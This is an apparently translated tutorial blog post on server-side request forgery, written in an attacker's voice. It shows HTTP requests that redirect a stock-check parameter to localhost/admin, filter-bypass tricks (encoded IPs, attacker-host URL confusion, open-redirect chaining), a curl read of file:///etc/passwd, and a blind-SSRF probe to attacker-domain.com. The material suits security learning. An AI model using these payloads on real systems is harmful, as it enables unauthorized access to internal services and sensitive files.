Server Side Request Forgery in the Deep

 |  Suggerisci modifica

Hey folks, today we’re focusing on SSRF. With this technique, we force the server to make requests wherever we want, both internal and external. The classic trick is to point to, say, localhost/admin to bypass access controls, exploiting the trust in local connections. If we manage to infiltrate here, the system is ours.

Classic SSRF Example#

The admin page of the web portal we’re analyzing is locked down. Direct access from /admin, no entry. But there’s a weak spot: the stock check function. Just an intercept with Burp Suite. We notice the request passes with a suspicious parameter: checkStock.

POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

checkStock=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1

At this point, I modify the URL passed to the parameter to point to http://localhost/admin and send the request.

POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

checkStock=http://localhost/admin

The server responds with the /admin page

HTTP/1.1 200 OK
Content-Type: text/html

<h1>Welcome to the Admin Dashboard</h1>
<p>Here you can manage users, view system logs, and configure server settings.</p>
<p><strong>System Status:</strong> All systems are operational.</p>
<p><strong>Recent Activity:</strong></p>
<ul>
    <li>User "john_doe" logged in at 10:23 AM</li>
    <li>Product "Laptop XYZ" updated at 11:45 AM</li>
    <li>Backup completed successfully at 12:00 PM</li>
</ul>
<p><a href="/admin/logs">View full activity logs</a></p>

Bypassing Common Defenses#

Defenses against SSRF attacks are becoming increasingly sophisticated, but there are various techniques to bypass them, still making exploitation possible. Here we explore some of the most effective methods for bypassing blacklist and whitelist-based filters and gaining access to protected internal systems.

Bypassing Blacklist or Whitelist-Based Filters#

Some applications attempt to block requests containing hosts like 127.0.0.1, localhost, or other sensitive resources. However, it’s possible to bypass these filters using various methods. For example: 127.0.0.1 can be written as 0x7f000001 (hexadecimal) or 0177.0000.0001 (octal notation). But there are other tricks. On HackTricks, for example, we find this excellent bypass list.

Whitelist filters, on the other hand, only allow specific URLs, but there are several ways to bypass them. For example, you can insert credentials before the allowed hostname, as in https://trusted.com:password@attacker-host, to trick the control. Another method is to exploit URL fragments, using the # character to hide the actual host, for example: https://attacker-host#trusted.com. Creating controlled subdomains can also be effective, as in trusted.com.attacker.io. Double encoding can also confuse the application’s parser, making it difficult to distinguish a legitimate URL from a manipulated one.

Useful Resource: URL Validation Bypass Cheat Sheet: The URL Validation Bypass Cheat Sheet by PortSwigger is an essential resource for discovering and exploiting SSRF vulnerabilities. It contains methods for bypassing URL validation controls, such as encoding, alternative IP formats, and open redirection, making it easier to overcome security filters.

SSRF Bypass via Open Redirection#

Sometimes, anti-SSRF filters can be bypassed by exploiting open redirection vulnerabilities. In these cases, the application only allows specific URLs but automatically follows redirects, allowing access to otherwise unreachable internal addresses.

For example, suppose the app only accepts URLs from https://trusted-shop.com. However, the site’s redirection functionality can be exploited to reach the internal admin interface:

POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 145

checkStock=https://trusted-shop.com/redirect?target=http://192.168.0.10:8080/admin

In this example, the app verifies that the URL starts with the allowed domain but then follows the redirect to the internal IP. This way, the attacker reaches the admin interface without directly violating the filter.

Exploiting open redirection vulnerabilities is particularly effective when filters are strict but the application doesn’t limit redirects. For this reason, it’s essential to carefully monitor both URL controls and the implemented redirect functionalities.

Protocol Bypass#

Some servers might restrict to certain whitelisted URLs, but you could bypass them using particular protocols. An example with file:// to obtain a sensitive file, like /etc/passwd:

curl -X GET "http://target.com/ssrf?url=file:///etc/passwd"

Using the file:// protocol directs the server to attempt to access sensitive local files on the system.

Blind SSRF#

Blind SSRF vulnerabilities occur when an application can be induced to send an HTTP request to an attacker-specified URL, but the response from this request is not returned to the user. While harder to exploit than traditional SSRF, they can still lead to remote code execution or other compromises.

For example, an attacker can verify the presence of a Blind SSRF vulnerability using a controlled domain:

POST /product/stock HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 145

checkStock=http://attacker-domain.com/ssrf-test

If the remote server makes a request to the indicated domain, the attacker will detect it in their server logs, confirming the vulnerability. From here, it’s possible to proceed with payloads designed to discover known vulnerabilities or even achieve remote code execution by exploiting flaws like Shellshock.

Blind SSRF vulnerabilities are often identified through out-of-band (OAST) techniques, such as those offered by tools like Burp Collaborator, which generate unique domains to detect outgoing requests from the application. This approach allows discovering vulnerabilities even when the server returns no direct evidence of the request.
